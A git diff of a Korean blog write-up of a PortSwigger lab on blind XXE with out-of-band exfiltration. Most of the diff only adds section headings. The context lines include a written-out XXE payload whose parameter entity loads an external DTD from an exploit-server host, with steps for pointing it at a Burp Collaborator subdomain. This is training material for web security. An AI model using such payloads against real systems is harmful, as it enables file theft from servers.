@@ -9,8 +9,6 @@ toc: true
 # 개요
 - Blind XXE 문제인데 XML의 파라메터 엔터티(Parameter Entity)를 통해 out-of-band 통신을 발생시키는 예제로 보인다. 
 - 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
-
-
 - 블라인드 XXE 설명 주소: https://portswigger.net/web-security/xxe/blind
 - 난이도: PRACTITIONER (중간)
 
@@ -33,7 +31,6 @@ To prevent the Academy platform being used to attack third parties, our firewall
 이 문제부터는 exploit server 가 등장한다. 다음과 같이 특정 경로 요청에 대해 어떤 응답을 보낼지를 설정할 수 있다. 
 
 ![exploit server](/images/burp-academy-exploit-servser.png)
-
 
 
 # 1차 시도 
@@ -96,6 +93,7 @@ Content-Length: 47
 여기서 부터는 잘 모르겠다. 정답을 봤다. 
 
 # 해답
+## Burp Collaborator URL을 취득
 이 문제를 풀려면 Burp Collaborator와 통신이 가능한 Burp Suite Professional 버전이 필요하다. 
 
 - STEP 1. Burp Suite Professional에서 Burp Collaborator 탭으로 이동한다. 
@@ -103,6 +101,8 @@ Content-Length: 47
 
 ![Burp Collaborator 페이로드 복사](/images/burp-academy-xxe-5-1.png)
 
+
+## DTD 를 만들고 exploit서버에 저장 
 - STEP 3. 다음 DTD 파일의 BURP-COLLABORATOR-SUBDOMAIN 을 복사한 페이로드로 바꾼다. 
 
 ```xml 
@@ -121,6 +121,9 @@ Content-Length: 47
 ```
 
 - STEP 4. exploit server 로 이동해서 위의 DTD 파일을 응답 Body 부분에 저장한다. 
+
+## 공격 페이로드를 변경 
+
 - STEP 5. 유저가  "Check stock" 버튼을 눌렀을 때의 POST 요청 바디 부분을 다음과 같이 바꾼다. 
 
 ```xml 
@@ -133,6 +136,7 @@ Content-Length: 47
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a5200f2036c3c94c2e7ba5c01230041.exploit-server.net/exploit"> %xxe;]>
 ```
 
+## 공격 시도 
 이 페이로드를  "Check stock" 버튼을 눌렀을 때의 POST 요청 바디로 전송한다. 400 Bad Request 응답이 돌아온다. 
 
 ![페이로드 전송](/images/burp-academy-xxe-5-2.png)
